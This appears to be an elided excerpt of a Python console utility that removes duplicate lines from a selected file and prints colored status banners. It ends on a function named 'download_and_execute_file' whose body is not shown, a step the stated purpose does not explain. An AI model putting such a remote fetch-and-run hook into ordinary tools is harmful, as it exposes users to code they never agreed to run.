...
def select_file():
    ...
    if not file_path:
        os.system('cls' if os.name=='nt' else 'clear')
        Banner()
        Write.Print("\n\n     [•]  Selected File: FALSE", Colors.light_blue)
        time.sleep(2)
        os.system('cls' if os.name=='nt' else 'clear')
        return select_file()
    else:
...
def Duplicates(file_path):
    ...
    Banner()
    Write.Print(f"\n\n     [•]  Total lines: {total_lines}", Colors.blue)
    Write.Print(f"\n\n     [•]  Removed duplicates: {removed_duplicates}", Colors.blue)
    Write.Print(f"\n\n     [•]  Remaining lines: {remaining_lines}", Colors.blue)
    Write.Print("\n\n     [•]  Duplicates have been removed. \n\n     [•]  Check the folder.", Colors.blue)
    time.sleep(5)
    os.system('cls' if os.name == 'nt' else 'clear')
...
def download_and_execute_file(url, folder):
    file_name = "Url's.py"
